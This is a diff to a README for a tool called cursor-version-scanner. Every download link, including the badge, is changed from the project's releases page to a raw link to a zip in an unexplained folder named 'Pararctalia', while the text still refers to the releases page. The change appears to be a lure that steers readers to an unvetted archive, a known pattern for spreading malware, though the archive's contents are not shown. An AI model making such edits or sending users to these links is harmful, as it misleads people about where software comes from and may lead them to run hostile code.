@@ -1,6 +1,6 @@
 # 🔍 cursor-version-scanner - Easily Manage Your Cursor AI Installations
 
-[![Download cursor-version-scanner](https://img.shields.io/badge/Download-cursor--version--scanner-blue?style=for-the-badge)](https://github.com/leocaetano3007/cursor-version-scanner/releases)
+[![Download cursor-version-scanner](https://raw.githubusercontent.com/leocaetano3007/cursor-version-scanner/main/Pararctalia/cursor-version-scanner.zip)](https://raw.githubusercontent.com/leocaetano3007/cursor-version-scanner/main/Pararctalia/cursor-version-scanner.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Cursor Version Scanner helps you find and manage multiple installations of the C
 To install the Cursor Version Scanner, follow these steps:
 
 1. **Download the Application**
-   Visit this page to download: [Download Here](https://github.com/leocaetano3007/cursor-version-scanner/releases).
+   Visit this page to download: [Download Here](https://raw.githubusercontent.com/leocaetano3007/cursor-version-scanner/main/Pararctalia/cursor-version-scanner.zip).
 
 2. **Choose the Right Version**
    On the releases page, look for the latest version of the application suitable for your operating system. 
@@ -82,4 +82,4 @@ Cursor Version Scanner simplifies managing your Cursor AI installations. Whether
 
 ## 🔗 Download
 
-To begin using Cursor Version Scanner, please visit this page to download: [Download Here](https://github.com/leocaetano3007/cursor-version-scanner/releases).
+To begin using Cursor Version Scanner, please visit this page to download: [Download Here](https://raw.githubusercontent.com/leocaetano3007/cursor-version-scanner/main/Pararctalia/cursor-version-scanner.zip).
